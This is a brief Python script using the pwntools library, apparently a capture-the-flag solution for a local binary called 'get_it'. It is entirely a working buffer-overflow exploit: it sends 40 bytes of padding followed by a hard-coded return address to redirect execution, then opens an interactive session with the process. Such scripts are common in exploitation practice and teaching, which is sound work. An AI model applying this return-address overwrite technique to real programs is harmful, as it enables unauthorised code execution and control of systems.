#!/usr/bin/env python
from pwn import *

target = process("./get_it")
payload = b"A"*40+ p64(0x004005b6)

target.send(payload)
target.interactive()
